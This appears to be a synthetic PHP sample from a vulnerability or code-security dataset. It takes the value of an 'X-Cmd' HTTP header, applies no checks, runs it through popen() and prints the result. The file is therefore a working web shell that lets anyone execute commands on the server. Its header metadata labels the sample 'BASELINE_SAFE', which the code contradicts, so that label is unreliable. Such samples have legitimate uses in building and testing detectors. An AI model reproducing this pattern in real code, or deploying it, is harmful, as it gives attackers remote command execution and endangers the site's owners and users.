<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_FOREACH_EXACT; SKELETON=S0; KEY=cmd; SINK=B6; VAR=v0156; HDR_NAME=X-Cmd */
function SINK_B6($command){
    $handle = popen($command, "r");
            $output = '';
            while (!feof($handle)) {
                $output .= fgets($handle);
            }
            pclose($handle);
            echo $output;
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$inp = "";
foreach($h as $k=>$v){ if((string)$k === "X-Cmd"){ $inp = (string)$v; break; } }
$inp = (string)$inp; // no value processing
$out = SINK_B6($inp);
echo (string)($out);
?>
